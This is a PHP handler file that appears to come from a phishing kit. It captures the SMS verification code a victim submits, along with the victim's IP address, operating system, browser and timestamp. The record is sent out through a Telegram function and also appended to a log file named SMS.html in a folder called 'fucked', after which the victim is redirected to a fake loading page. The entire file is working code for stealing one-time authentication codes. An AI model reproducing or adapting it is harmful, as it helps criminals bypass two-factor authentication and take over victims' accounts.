<?php
require_once("../../config.php");

$sms = $_POST['sms'];
if(!empty($sms))
{
    $message = '/-- SMS CODE --/' . getIPAddress() . "\r\n";
    $message .= '[SMS CODE] = ' . $sms . "\r\n";
    $message .= '[TIME/DATE] = ' . $date . "\r\n";
    $message .= '[IP address] = ' . getIPAddress() . "\r\n";
    $message .= '[OS] = ' . $user_os . "\r\n";
    $message .= '[BROWSER] = ' . $user_browser . "\r\n";
    telegram_send(urlencode($message));
    $house = fopen('../fucked/SMS.html', 'a');
    fwrite($house, $message);
    fclose($house);
    header("Location: ../loading.php?id=finish");
}
?>